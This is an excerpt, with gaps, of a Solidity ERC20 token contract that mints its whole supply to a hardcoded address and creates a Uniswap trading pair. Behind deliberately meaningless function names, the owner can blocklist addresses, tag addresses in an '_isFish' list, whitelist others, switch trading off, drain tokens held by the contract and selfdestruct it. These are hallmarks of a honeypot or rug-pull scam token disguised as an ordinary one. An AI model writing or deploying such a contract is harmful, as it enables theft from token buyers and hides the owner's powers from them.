...
contract hello1 is  Context, IERC20, Ownable, ReentrancyGuard{
    ...
    address public help;
    address private _receive = address(0x79deb426d2795c6b75Ac89942ca64Cf0FD66ba76);
    // 
    ...
    constructor(address _help) {
       ...
       swapPairAddress1 = IUniswapV2Factory(_router.factory()).createPair(
        ...
        _balances[_receive] = 250000 * 10**18;
        _totalSupply = 250000 * 10**18;
        emit Transfer(address(0), _receive, 250000 * 10**18);
    }
    ...
    function mbn_one(address addr, bool state) external onlyOwner{
        require(addr != address(0), "ERC20: addr the zero address");
        _abcdList[addr] = state;
    }

    function jei_two(address addr) public view returns(bool){
        require(addr != address(0), "ERC20: addr the zero address");
        return  _abcdList[addr];
    }

    function xlv_three(address addr, bool state) external onlyOwner{
        require(addr != address(0), "ERC20: addr the zero address");
        _isWhite[addr]=state;
    }
    function mwm_four(address addr, bool state) external onlyOwner{
        require(addr != address(0), "ERC20: addr the zero address");
        _isFish[addr] = state;
    }


    function uem_five(address addr) public view returns (bool){
        return _isFish[addr];
    }

    function imv_sex(address addr)external view returns(bool){
        require(addr != address(0), "ERC20: addr the zero address");
        return _isWhite[addr];
    }

    function kfn_seven(bool state) external onlyOwner {
        trading = state;
    }
    function j1q_eight() public view returns(bool){
        return trading;
    }

    function vxm_nine(address tokenAddress) external onlyOwner {
        IERC20 token = IERC20(tokenAddress);
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }
    
    function wk2_ten()external onlyOwner{
        selfdestruct(payable(msg.sender));
    }

    function jjj_eleven()external view returns(uint) {
        return iii.length;
    }
    function sle_twelve()external view returns(address[] memory){
        return iii;
    }
}